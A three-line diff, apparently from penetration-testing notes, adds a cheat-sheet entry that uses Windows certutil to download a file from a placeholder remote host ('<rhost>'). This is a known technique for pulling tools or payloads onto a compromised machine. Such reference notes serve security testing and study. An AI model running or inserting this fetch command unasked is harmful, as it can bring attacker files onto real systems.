@@ -1,0 +1,3 @@
+# download file
+certutil -urlcache -split -f http://<rhost>/<file>
+
